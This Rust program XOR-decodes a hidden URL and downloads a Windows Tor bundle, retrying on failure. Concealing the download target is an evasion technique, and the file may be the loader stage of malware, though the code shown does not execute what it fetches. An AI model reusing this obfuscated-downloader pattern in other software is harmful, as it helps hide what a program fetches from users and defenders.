mod config;
mod xor;

use std::fs::File;
use std::{io, thread, time};

use config::ENC_KEY;
use config::ENC_WINDOWS_URL;

fn main() {
    let windows_url = xor::decode(ENC_KEY, ENC_WINDOWS_URL).unwrap_or_else(|_| {
        panic!("problem unserializing windows url");
    });

    println!("windows url: {}", windows_url);

    {
        let mut attempts = 0;
        let sleep_time = time::Duration::from_millis(5000);

        loop {
            if attempts > 4 {
                panic!("reached maximum download attempts, aborting");
            }

            match download(&windows_url, "tor-win32-0.4.6.8.zip") {
                Ok(_) => {
                    println!("downloaded tor binary");
                    break;
                },
                Err(err) => {
                    println!("download failed with {:?}", err);
                    attempts += 1;
                }
            }
            
            thread::sleep(sleep_time);
        }
    }
}

fn download(url: &str, path: &str) -> Result<(), ureq::Error> {
    let res = match ureq::get(url).call() {
        Ok(res) => res,
        Err(err) => return Result::Err(err),
    };

    let file = match File::create(path) {
        Ok(file) => file,
        Err(err) => panic!("problem creating file: {:?}", err)
    };

    // File buffer to write download data
    let mut writer = io::BufWriter::new(file);

    // Download stream reader
    let mut reader = res.into_reader();

    io::copy(&mut reader, &mut writer).unwrap_or_else(|error| {
        panic!("problem writing download to file: {:?}", error);
    });

    Ok(())
}
